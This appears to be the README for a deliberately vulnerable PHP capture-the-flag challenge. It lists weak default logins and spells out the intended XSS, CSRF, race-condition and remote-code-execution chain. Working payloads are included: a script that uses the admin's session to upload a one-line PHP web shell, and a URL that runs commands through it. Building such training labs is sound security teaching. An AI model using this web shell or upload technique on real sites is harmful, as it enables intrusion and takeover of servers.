# ShellRace CTF Challenge

This is a vulnerable PHP application designed for Capture The Flag (CTF) competitions. It contains several deliberately implemented vulnerabilities that form an exploit chain:

1. XSS (Cross-Site Scripting)
2. CSRF (Cross-Site Request Forgery)
3. Race Condition
4. RCE (Remote Code Execution)

## Setup Instructions

1. Deploy this application on a PHP-enabled web server (e.g., Apache with PHP).
2. Make sure the `uploads` directory is writable by the web server.
3. Run the admin bot periodically (e.g., via a cron job):
   ```
   */1 * * * * php /path/to/admin_bot.php
   ```

## Login Credentials

- Regular user: `user` / `password123`
- Admin: `admin` / `adminpass`

## Vulnerability Chain

### 1. XSS Vulnerability

The comments section in the dashboard doesn't sanitize user input, making it vulnerable to XSS attacks.

Example payload:
```html
<script>alert('XSS vulnerability!');</script>
```

### 2. CSRF via XSS

Since the admin bot visits the dashboard and views all comments, an attacker can inject JavaScript that performs a CSRF attack to upload a malicious PHP shell.

Example payload:
```html
<script>
// Create a hidden form to upload a PHP shell
var form = document.createElement('form');
form.method = 'POST';
form.action = 'admin.php';
form.enctype = 'multipart/form-data';
form.style.display = 'none';

// Create the file data
var fileData = '<?php system($_GET["cmd"]); ?>';
var blob = new Blob([fileData], {type: 'application/x-php'});
var formData = new FormData();
formData.append('file', blob, 'shell.php');

// Submit the form via fetch API
fetch('admin.php', {
  method: 'POST',
  body: formData,
  credentials: 'include'
}).then(response => {
  console.log('Shell uploaded successfully!');
});

</script>
```

### 3. Race Condition

The uploaded shell is automatically deleted after 10 seconds, so there's a small window to exploit it.

### 4. Remote Code Execution (RCE)

Once the shell is uploaded, the attacker can execute system commands by visiting:
```
http://localhost/uploads/shell.php?cmd=id
```

## The HTTP-only Cookie Protection

The session cookie is set with the HTTP-only flag, preventing JavaScript from accessing it directly. However, the CSRF attack leverages the admin's active session, bypassing this protection.

## Flag Location

For CTF purposes, place a flag file at a non-guessable location, for example:
```
/flag_0xf8a2b3c4.txt
```

## Legal Disclaimer

This application is intended for educational purposes and authorized security testing only. Do not deploy it on public-facing servers or use it against systems without proper authorization. 